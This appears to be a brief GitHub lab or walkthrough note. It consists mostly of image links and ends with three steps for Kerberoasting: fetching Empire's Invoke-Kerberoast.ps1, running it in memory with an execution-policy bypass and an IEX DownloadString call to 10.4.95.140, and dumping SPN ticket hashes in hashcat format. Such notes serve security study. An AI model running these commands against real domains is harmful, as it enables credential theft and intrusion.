![image](https://github.com/user-attachments/assets/51305beb-5cee-40a8-b95d-5772deda6701)
![image](https://github.com/user-attachments/assets/2f31e786-307a-4b4c-a48c-45be231e94fc)
![image](https://github.com/user-attachments/assets/74abcda2-fc49-4a15-9794-62846da2c92b)
![image](https://github.com/user-attachments/assets/6c914723-c869-4f76-ad40-fd1d648c06f1)
![image](https://github.com/user-attachments/assets/e53ed01c-91fc-4517-8046-8444433dc375)
![image](https://github.com/user-attachments/assets/8f727c3a-c650-4e26-9d72-e7e020d33ede)
![image](https://github.com/user-attachments/assets/2602a5f0-f473-4ada-8235-8d42da9a31e7)
![image](https://github.com/user-attachments/assets/1710a697-8039-466d-862c-53bc29400d7b)
![image](https://github.com/user-attachments/assets/b9b1853b-e1ad-43e1-8423-d7b8e9af7864)
![image](https://github.com/user-attachments/assets/f6988213-c004-4228-90ae-4e763b0073ac)
![image](https://github.com/user-attachments/assets/14f1c62c-0de4-401a-9d00-bad247279b3f)
![image](https://github.com/user-attachments/assets/de5fa436-8396-4e47-b2e4-f580bc7d689a)
![image](https://github.com/user-attachments/assets/46e64634-dde3-43b4-9722-64ad2f5696fb)
![image](https://github.com/user-attachments/assets/3aa648dc-bafe-40c5-9690-ad201a7e39d2)
![image](https://github.com/user-attachments/assets/81b10f25-6809-4f64-b0d9-71bf899a7cf8)
![image](https://github.com/user-attachments/assets/a0536f97-5a81-4745-883a-2b6c3cb2c8eb)
![image](https://github.com/user-attachments/assets/9c384af2-7761-4d65-858b-df438bdc1807)
![image](https://github.com/user-attachments/assets/3dec7fde-ba51-421b-b8cd-73629cf6bf7a)
![image](https://github.com/user-attachments/assets/2c8a3579-1425-478e-ac6d-3ce2c48b9a7d)
![image](https://github.com/user-attachments/assets/01e68259-f8fa-4437-a368-a76222c0c452)
![image](https://github.com/user-attachments/assets/efcb8d48-3f07-46eb-a5fc-ee2fe9a6ebd3)
![image](https://github.com/user-attachments/assets/39f2286a-30c1-408d-b927-37741d3f1e83)

Another way to get SPN TGS ticket: 

1. download Kerberoast.ps1 (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)

2. upload to writable path (PS C:\Windows\System32\spool\drivers\color> powershell -ep bypass;
IEX(New-Object Net.WebClient).DownloadString('https://10.4.95.140/Kerberoast.ps1') 

3. Invoke-Kerberoast -OutputFormat hashcat ​ |fl
